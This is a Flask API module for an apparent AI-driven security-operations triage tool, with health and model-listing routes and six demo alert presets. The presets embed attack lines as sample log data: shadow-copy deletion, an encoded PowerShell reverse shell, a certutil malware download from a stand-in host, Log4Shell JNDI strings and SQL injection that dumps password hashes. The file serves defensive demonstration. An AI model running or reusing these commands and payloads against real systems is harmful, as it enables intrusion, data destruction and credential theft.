from flask import Blueprint, jsonify
from config import Config
from models.database import db, Investigation, IOCRecord
from services.ollama_service import ollama_service
from services.rag_service import rag_service
from sqlalchemy import text

system_bp = Blueprint("system", __name__, url_prefix="/api")

@system_bp.route("/health", methods=["GET"])
def health_check():
    """System status check for MariaDB, Ollama, and ChromaDB."""
    # 1. MariaDB status
    db_status = "offline"
    try:
        db.session.execute(text("SELECT 1"))
        db_status = "connected"
    except Exception as e:
        db_status = f"error: {str(e)}"

    # 2. Ollama status
    ollama_health = ollama_service.check_health()

    # 3. ChromaDB status
    chroma_stats = rag_service.get_stats()

    # Overall investigations & IOC counts
    inv_count = 0
    ioc_count = 0
    try:
        inv_count = Investigation.query.count()
        ioc_count = IOCRecord.query.count()
    except Exception:
        pass

    return jsonify({
        "status": "online" if db_status == "connected" and ollama_health.get("available") else "degraded",
        "mariadb": {
            "status": db_status,
            "database": Config.MYSQL_DATABASE,
            "host": f"{Config.MYSQL_HOST}:{Config.MYSQL_PORT}"
        },
        "ollama": ollama_health,
        "chromadb": chroma_stats,
        "metrics": {
            "total_investigations": inv_count,
            "total_iocs": ioc_count
        },
        "default_models": {
            "main": Config.OLLAMA_MAIN_MODEL,
            "fast": Config.OLLAMA_FAST_MODEL,
            "deep": Config.OLLAMA_REPORT_MODEL,
            "embed": Config.OLLAMA_EMBED_MODEL
        }
    })

@system_bp.route("/models", methods=["GET"])
def get_models():
    """Return available Ollama models with roles."""
    installed = ollama_service.list_models()
    model_names = [m.get("name") for m in installed]

    suggested_roles = [
        {
            "id": Config.OLLAMA_MAIN_MODEL,
            "name": f"{Config.OLLAMA_MAIN_MODEL} (Main Cybersecurity Analysis)",
            "role": "main",
            "installed": any(Config.OLLAMA_MAIN_MODEL.lower() in m.lower() for m in model_names),
            "description": "Primary Tier-3 SOC analyst model for thorough threat triage, MITRE mapping, and risk calculation."
        },
        {
            "id": Config.OLLAMA_FAST_MODEL,
            "name": f"{Config.OLLAMA_FAST_MODEL} (Fast Triage)",
            "role": "fast",
            "installed": any(Config.OLLAMA_FAST_MODEL.lower() in m.lower() for m in model_names),
            "description": "Lightweight model optimized for rapid alert screening and immediate containment recommendations."
        },
        {
            "id": Config.OLLAMA_REPORT_MODEL,
            "name": f"{Config.OLLAMA_REPORT_MODEL} (Deep Report Generation)",
            "role": "deep",
            "installed": any(Config.OLLAMA_REPORT_MODEL.lower() in m.lower() for m in model_names),
            "description": "Deep reasoning model for executive debriefs, multi-stage attack forensics, and compliance reports."
        }
    ]

    return jsonify({
        "all_installed": model_names,
        "configured_profiles": suggested_roles,
        "default_model": Config.OLLAMA_MAIN_MODEL
    })

@system_bp.route("/presets", methods=["GET"])
def get_presets():
    """Curated SOC alert scenarios for instant testing and demonstration."""
    presets = [
        {
            "id": "ransomware_vssadmin",
            "title": "Ransomware Execution & Volume Shadow Copy Deletion",
            "alert_type": "Endpoint / EDR Alert",
            "recommended_model": Config.OLLAMA_MAIN_MODEL,
            "raw_input": """Event ID 4688 - A new process has been created.
Subject: Security ID: S-1-5-21-392019-1001, Account Name: Administrator
Process Information:
  New Process ID: 0x2af4
  New Process Name: C:\\Windows\\System32\\cmd.exe
  Process Command Line: cmd.exe /c "vssadmin.exe delete shadows /all /quiet & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no"
  Parent Process Name: C:\\Users\\Administrator\\AppData\\Local\\Temp\\updater_x64.exe
Network Connection Detected:
  Source IP: 192.168.10.45
  Destination IP: 185.220.101.5
  Destination Port: 443 (HTTPS)
File Modification Spike:
  1,420 files renamed to .locked in C:\\Shares\\Finance with note README_RESTORE_FILES.txt
File SHA256: 8b1a9953c4611296a827abf8c47804d7ecd3ee19a2e6f47702bf92147ff3a339"""
        },
        {
            "id": "powershell_lsass_dump",
            "title": "PowerShell Reverse Shell & LSASS Credential Dumping",
            "alert_type": "SIEM / Sysmon Detection",
            "recommended_model": Config.OLLAMA_MAIN_MODEL,
            "raw_input": """Sysmon Event 1: Process Create
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADQALgAyADYALgAyADkALgAxADQANQAiACwANAA0ADQANAApADs...
ParentImage: C:\\Windows\\System32\\w3wp.exe
User: IIS APPPOOL\\DefaultAppPool

Sysmon Event 10: ProcessAccess
SourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
TargetImage: C:\\Windows\\System32\\lsass.exe
GrantedAccess: 0x1010 (PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION)
CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9fb14|C:\\Windows\\System32\\KERNELBASE.dll+2c38e

Network Egress:
  Local: 10.0.1.15:49210
  Remote: 194.26.29.145:4444
Downloaded Payload URL: http://cdn-update-service.cc/stage2.bin"""
        },
        {
            "id": "log4shell_exploit",
            "title": "Apache Log4j2 JNDI RCE Exploit (Log4Shell)",
            "alert_type": "WAF / IDS Alert",
            "recommended_model": Config.OLLAMA_FAST_MODEL,
            "raw_input": """WAF Alert: CVE-2021-44228 Log4j JNDI Exploit String in HTTP Headers
Timestamp: 2026-10-02 09:41:12 UTC
Source IP: 45.154.255.89 (Threat Category: Scanner/Exploitation)
Target IP: 172.16.50.12 (Internal Payment Gateway)
HTTP Request:
  GET /api/v1/auth/login HTTP/1.1
  Host: payment.corp.internal
  User-Agent: ${jndi:ldap://45.154.255.89:1389/ExploitClass}
  X-Forwarded-For: ${jndi:rmi://45.154.255.89:1099/Payload}
Follow-up Outbound Traffic:
  Target host 172.16.50.12 attempted outbound TCP connection on port 1389 to 45.154.255.89 (Flagged and RST by Perimeter Firewall)."""
        },
        {
            "id": "phishing_macro_c2",
            "title": "Spearphishing Email with Malicious Macro & C2 Domain",
            "alert_type": "Email Gateway / Sandbox",
            "recommended_model": Config.OLLAMA_MAIN_MODEL,
            "raw_input": """Email Gateway Detection:
Sender: payroll-secure@officereports-verify.com
Recipient: sarah.connor@cyberdefense.local
Subject: URGENT: Q3 Payroll Bonus Confirmation Attached
Attachment: Q3_Bonus_Calculation.docm
MD5: 5d41402abc4b2a76b9719d911017c592
SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855

Sandbox Behavioral Analysis:
  Office Word macro auto-executed: Document_Open()
  Spawns: certutil.exe -urlcache -split -f http://evil-updates.top/payload.exe C:\\Users\\Public\\svchost.exe
  Registry Key Created: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateService = C:\\Users\\Public\\svchost.exe
  C2 Communication to: evil-updates.top (IP: 91.241.19.84) on port 8443"""
        },
        {
            "id": "sqli_dump",
            "title": "SQL Injection & Database Schema Exfiltration",
            "alert_type": "Web Application Firewall",
            "recommended_model": Config.OLLAMA_FAST_MODEL,
            "raw_input": """NGINX Access Log & WAF Event:
103.251.167.22 - - [02/Oct/2026:08:15:33 +0000] "GET /products.php?id=-1%20UNION%20SELECT%201,table_name,column_name,4%20FROM%20information_schema.columns%20WHERE%20table_schema=database()-- HTTP/1.1" 200 4521 "https://portal.target.com" "sqlmap/1.7#stable"
103.251.167.22 - - [02/Oct/2026:08:15:40 +0000] "GET /products.php?id=-1%20UNION%20SELECT%20id,username,password_hash,email%20FROM%20users-- HTTP/1.1" 200 18920
Repeated hits targeting /products.php resulting in 200 OK responses with anomalous payload sizes exceeding 18KB. Target database: mariadb."""
        },
        {
            "id": "zerologon_dc_compromise",
            "title": "Zerologon Netlogon Attack on Domain Controller",
            "alert_type": "Active Directory / SIEM Detection",
            "recommended_model": Config.OLLAMA_REPORT_MODEL,
            "raw_input": """Active Directory Domain Controller Security Log:
Domain Controller: DC01.corp.internal (IP: 192.168.1.5)
Event ID 4742 - A computer account was changed.
Target Account Name: DC01$
Changed Attributes:
  Password Last Set: 2026-10-02 07:12:00 (Password reset to blank)
Event ID 5829 - The Netlogon service allowed an unsecure Netlogon connection.
Client Machine: WORKSTATION-08 (192.168.1.112)
Attacker chained with CVE-2020-1472.
Subsequent Event 4624:
  Logon Type: 3 (Network)
  Account: Administrator
  Logon ID: 0x3F812B
Attacker dumped NTDS.dit via ntdsutil.exe from WORKSTATION-08."""
        }
    ]
    return jsonify(presets)
